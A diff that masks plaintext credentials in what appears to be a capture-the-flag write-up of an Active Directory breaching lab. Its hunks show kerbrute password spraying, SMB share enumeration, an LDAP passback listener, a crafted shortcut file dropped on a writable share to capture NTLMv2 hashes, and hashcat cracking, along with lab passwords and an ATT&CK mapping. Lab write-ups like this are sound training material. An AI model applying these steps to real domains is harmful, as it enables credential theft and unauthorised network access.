@@ -114,9 +114,9 @@ git log -p | grep -i "password\|secret\|token\|key\|credential"
 
 | Secret | Value | Context |
 |---|---|---|
-| DB Password | `Jen5k1ns2025!` | Database / Jenkins |
-| App Secret Key | `mc-webapp-s3cret-k3y` | Web application signing |
-| Onboarding Password | `MegaCorp01!` | Default password for new employees |
+| DB Password | `Jen5k???2025!` | Database / Jenkins |
+| App Secret Key | `mc-weba???cret-k3y` | Web application signing |
+| Onboarding Password | `Mega???p01!` | Default password for new employees |
 
 A developer had committed credentials, then removed them in a subsequent commit titled *"Security: remove hardcoded credentials, use environment variables"* — but `git log -p` revealed both versions.
 
@@ -140,15 +140,15 @@ A single round of spraying (one password across all users) is generally safe eve
 Using the onboarding password found in git history:
 
 ```bash
-kerbrute passwordspray -d thm.loc --dc 192.168.12.100 /root/valid_users.txt 'MegaCorp01!'
+kerbrute passwordspray -d thm.loc --dc 192.168.12.100 /root/valid_users.txt 'Meg???01!'
 ```
 
 **Result — 2 accounts never changed their default password:**
 
 | Username | Password |
 |---|---|
-| `dev.intern` | `MegaCorp01!` |
-| `alice.moore` | `MegaCorp01!` |
+| `dev.intern` | `Meg??p01!` |
+| `alice.moore` | `Meg???01!` |
 
 > **First domain credentials obtained — breaching successful.**
 
@@ -177,13 +177,13 @@ nc -nlvp 3489
 
 ```
 CN=svc.ldap,OU=Service Accounts,DC=thm,DC=loc
-Password: Pr1ntBind2025!
+Password: Pr1???d2025!
 ```
 
 ### Verification
 
 ```bash
-nxc smb 192.168.12.100 -u 'svc.ldap' -p 'Pr1ntBind2025!'
+nxc smb 192.168.12.100 -u 'svc.ldap' -p 'Pr???2025!'
 # → STATUS_ACCOUNT_DISABLED
 ```
 
@@ -204,7 +204,7 @@ When Windows Explorer opens a folder containing specially crafted files (SCF, UR
 1. Enumerated writable shares:
 
 ```bash
-nxc smb 192.168.12.51 -u dev.intern -p 'MegaCorp01!' --shares
+nxc smb 192.168.12.51 -u dev.intern -p 'Me???01!' --shares
 # → shared-docs (READ,WRITE)
 ```
 
@@ -229,7 +229,7 @@ EOF
 4. Uploaded to the writable share:
 
 ```bash
-smbclient //192.168.12.51/shared-docs -U 'thm.loc\dev.intern%MegaCorp01!'
+smbclient //192.168.12.51/shared-docs -U 'thm.loc\dev.intern%Me???p01!'
 put @Shortcut.url
 exit
 ```
@@ -257,10 +257,10 @@ hashcat -m 5600 sarah_hash.txt /usr/share/wordlists/rockyou.txt
 
 | Username | Password | Source | Status |
 |---|---|---|---|
-| `dev.intern` | `MegaCorp01!` | Password spraying (git leak) | ✅ Active |
-| `alice.moore` | `MegaCorp01!` | Password spraying (git leak) | ✅ Active |
-| `svc.ldap` | `Pr1ntBind2025!` | LDAP passback (printer) | ❌ Disabled |
-| `sarah.jones` | `Trustno1` | NTLMv2 crack (Responder + SCF) | ✅ Active |
+| `dev.intern` | `Meg??rp01!` | Password spraying (git leak) | ✅ Active |
+| `alice.moore` | `Mega??p01!` | Password spraying (git leak) | ✅ Active |
+| `svc.ldap` | `Pr1nt??d2025!` | LDAP passback (printer) | ❌ Disabled |
+| `sarah.jones` | `T??no1` | NTLMv2 crack (Responder + SCF) | ✅ Active |
 
 ---
 
@@ -303,7 +303,7 @@ hashcat -m 5600 sarah_hash.txt /usr/share/wordlists/rockyou.txt
 | Technique | ID | Description |
 |---|---|---|
 | Gather Victim Identity Information | T1589.001 | LinkedIn OSINT for username harvesting |
-| Brute Force: Password Spraying | T1110.003 | Spraying `MegaCorp01!` across valid users |
+| Brute Force: Password Spraying | T1110.003 | Spraying `Me??p01!` across valid users |
 | Unsecured Credentials: Credentials in Files | T1552.001 | Hardcoded secrets in git commit history |
 | Forced Authentication | T1187 | SCF/URL file on writable SMB share |
 | Steal Application Access Token | T1528 | LDAP passback credential interception |
